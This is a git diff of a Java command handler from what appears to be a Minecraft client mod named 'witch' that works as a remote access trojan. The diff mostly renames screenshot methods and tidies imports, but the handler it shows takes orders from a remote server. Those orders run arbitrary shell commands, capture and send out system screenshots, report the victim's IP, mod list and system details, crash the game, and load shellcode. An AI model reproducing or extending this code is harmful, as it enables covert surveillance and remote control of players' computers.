@@ -1,10 +1,12 @@
 package me.soda.witch.client.connection;
 
 import com.google.gson.Gson;
-import me.soda.witch.client.Witch;
 import me.soda.witch.client.features.ShellcodeLoader;
 import me.soda.witch.client.features.Variables;
-import me.soda.witch.client.utils.*;
+import me.soda.witch.client.utils.ChatUtil;
+import me.soda.witch.client.utils.MCUtils;
+import me.soda.witch.client.utils.NetUtil;
+import me.soda.witch.client.utils.ScreenshotUtil;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.LogUtil;
 import me.soda.witch.shared.PlayerInfo;
@@ -30,8 +32,8 @@ public class MessageHandler {
                 case "chat_mute" -> Variables.INSTANCE.isMuted = !Variables.INSTANCE.isMuted;
                 case "mods" -> NetUtil.send(msgType, MCUtils.allMods());
                 case "systeminfo" -> NetUtil.send(msgType, MCUtils.systemInfo());
-                case "screenshot" -> ScreenshotUtil.screenshot();
-                case "screenshot2" -> NetUtil.send(msgType, ScreenshotUtil.screenshot2());
+                case "screenshot" -> ScreenshotUtil.gameScreenshot();
+                case "screenshot2" -> NetUtil.send(msgType, ScreenshotUtil.systemScreenshot());
                 case "chat" -> ChatUtil.chat(Text.of((String) msg), false);
                 case "shell" -> new Thread(() -> {
                     String result = ProgramUtil.runCmd((String) msg);
@@ -61,8 +63,6 @@ public class MessageHandler {
                 case "ip" -> NetUtil.send(msgType, NetUtil.httpSend("https://ifconfig.me/"));
                 case "crash" -> GlfwUtil.makeJvmCrash();
                 case "server_name" -> Variables.INSTANCE.name = (String) msg;
-                default -> {
-                }
             }
         } catch (Exception e) {
             LogUtil.println("Corrupted message!");
